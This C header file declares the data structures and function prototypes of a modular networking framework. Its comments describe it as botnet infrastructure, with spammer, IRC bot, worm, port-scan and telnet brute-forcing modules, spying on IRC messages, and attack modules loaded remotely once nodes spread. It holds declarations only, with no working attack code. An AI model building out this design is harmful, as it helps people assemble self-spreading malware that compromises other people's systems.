
//typedef unsigned int uint32_t;

// queue for outgoing messages, or incoming parsing.. etc..
typedef struct _queue {
    struct _queue *next;
    // queue buffer
    char *buf;
    // fd goes here to auto close connections with L_del
    int empty;
    // start timestamp
    uint32_t start_ts;
    
    // queue size
    int size;
    
    int chopped;
} Queue;

enum {
    RET_ERROR=-1,
    RET_SAME=0,
    RET_OK=1,
    // tcp connection
    TYPE_TCP=2,
    // udp socket (for sending)
    TYPE_UDP=4,
    // bound udp to a port
    UDP_BIND=8,
    // bound tcp to a port
    TCP_LISTEN=16,
    // raw socket
    TYPE_RAW=32,
    // I'll attempt to solve for most modules..
    TCP_NEW=64,
    TCP_CONNECTED=128,
    APP_HANDSHAKE=256,
    APP_HANDSHAKE_ACK=512,
    
    STATE_OK=1024,
    // do we close this connection after outgoing is flushed?
    TCP_CLOSE_AFTER_FLUSH=2048    
};

struct _modules;
typedef struct _connection {
    struct _connection *next;
     // buffer (if message parsing, etc requires)
    char *buf;
    // file descriptor/socket
    int fd;
    // timestamp for creation
    uint32_t start_ts;

    
    struct _modules *module;
    
    // list its on
    struct _connection **list;
    
    int buf_size;
       
    uint32_t addr;
    uint32_t reported_addr;
    
    int type;
    
    
    // ip of connection
    uint32_t ip;
    // port we're connecting to
    unsigned short port;
    // time stamp
    
    // last ping / pong
    uint32_t ping_ts;
    
    Queue *incoming;
    Queue *outgoing;
    
    // is it closed and should be recycled?
    int closed;
    
    int state;
    
    // if we cannot change state until the outgoing queue completes
    // this is useful for enabling encryption.. the keys need to be transferred
    // before it can take place.. but before any packets are processed incoming
    // *** might not be required.. maybe remove if i dont use
    int flush_state;
} Connection;

// function declaration for our notes..
struct _modules;
typedef int (*module_func)(struct _modules *, Connection *, char *, int);
typedef int (*module_func_ptr)(struct _modules *, Connection *, char **, int *);
// this next one is specifically for crypto currencies.. so we can use same code for bitcoin/litecoin/etc
typedef char *(*build_version_func)(int *);
typedef int (*connect_nodes_func)(struct _modules *note, int count);
typedef int (*external_func)(void);

// declaration for other modules
// such as: DHT, Spammer, IRC Bot, WORM,
// Port Scan, etc..

typedef struct _module_funcs {
    // read incoming data (in case encryption)
    // this needs a new func type with pointers to buf, size to replace them if need be
    module_func_ptr read_ptr;
    // writing outgoing data (in case encryption)
    module_func_ptr write_ptr;
    // incoming message parsing
    module_func incoming;
    // parsing outgoing messages (maybe filtering, etc)
    // needs function ponters like read..
    module_func_ptr outgoing;
    // obtain nodes for connection
    // all currency should do this immediately on startup, and every 15-20minutes
    module_func plumbing;
    // how do we find nodes to connect to?
    //module_func main_loop;
    // on connect
    module_func connect;
    // end of connection.. added so telnet can re-establish for brute forcing
    module_func disconnect;
} ModuleFuncs;

struct _nodes;

// current status of note
typedef struct _modules {
    struct _modules *next;
    // any buffer maybe required (itll get free'd on remove)
    char *buf;
    // fd has to be in place (if its not 0 itll get closed)
    int fd;
    // timestamp for creation
    uint32_t start_ts;
    
    // if we are attempting to listen
    int listen_port;
    // state of crypto currency (our connections, etc)
    int state;
    
    uint32_t timer_ts;
    int timer_interval;

    
    ModuleFuncs *functions;
    Connection *connections;
    
    struct _nodes *node_list;
    
    // placeholder if the module has custom functions
    int *custom_functions;
    
    // any kind of custom data that has to be passed around
    //void *custom_data;
    
    // magic bytes for crypto currencies
    char *magic;
    
    // size of magic bytes
    int magic_size;
} Modules;



typedef struct _nodes {
    // first 3 are required in this order..
    struct _nodes *next;
    char *buf;
    int fd;
    uint32_t start_ts;
    
    uint32_t addr;
    int port;
    
    int connected;
    
    // did we connect directly?
    int direct;
    // ignore ? is it dead, etc
    int ignore;
    // first seen
    uint32_t first_ts;
    // last seen
    uint32_t last_ts;
    
    int failures;
} Node;


// should move to utils.h/cpp
Connection *ConnectionFind(Connection *list, uint32_t addr);
int RelayAdd(Modules *module, Connection *conn, char *buf, int size);
int QueueAdd(Modules *module, Connection *conn, Queue **queue, char *buf, int size);
int Module_Add(Modules **_module_list, Modules *newmodule);
Connection *tcp_connect(Modules *note, Connection **connections, uint32_t ip, int port, Connection **_conn);
char *QueueParseAscii(Queue *qptr, int *size);
void ConnectionBad(Connection *cptr);
Connection *ConnectionAdopt(Modules *original, Modules *newhome, Connection *conn);
void QueueFree(Queue **qlist);
void ConnectionRead(Connection *cptr);
int QueueMerge(Queue **queue);
void ConnectionNew(Connection *cptr);
Connection *tcp_listen(Modules *mptr, int port);
Connection *ConnectionByDST(Modules *mptr, uint32_t dst);
Node *node_find(Modules *note, uint32_t addr);
Node *node_add(Modules *note, uint32_t addr);
int QueueChop(Queue *qptr, int size);
Queue *QueueFindBuf(Queue *qlist, char *buf);
int QueueChopBuf(Connection *cptr, char *buf, int size);

// if we wanna spy on any modules functions (so our module gets the messages)
// then this is how we can do it..
// botlink to see irc privmsgs
typedef struct _spy_func {
    struct _spy_func *next;
    char *buf;
    int fd;
    uint32_t start_ts;
    
    Modules *module;
    
    ModuleFuncs funcs;
} SpyFuncs;

SpyFuncs *SpyGet(Modules *mptr);

// modules that can be loaded later so we can distribute and let the nodes build up
// so attack modules, etc can get loaded later
typedef struct _external_module {
    struct _external_module *next;
    char *buf;
    int fd;
    uint32_t start_ts;
    
    int id;
    int size;
    
    int outfd;
    
    void *dl_handle;
    // modules after loading..
    external_func init;
    external_func deinit;
    module_func plumbing;
} ExternalModules;

ExternalModules *ExternalFind(int id);
int ExternalDeinit(ExternalModules *eptr);
int ExternalInit(ExternalModules *eptr);
ExternalModules *ExternalAdd(int id, char *buf, int size, int init);
void *CustomPtr(Connection *cptr, int custom_size);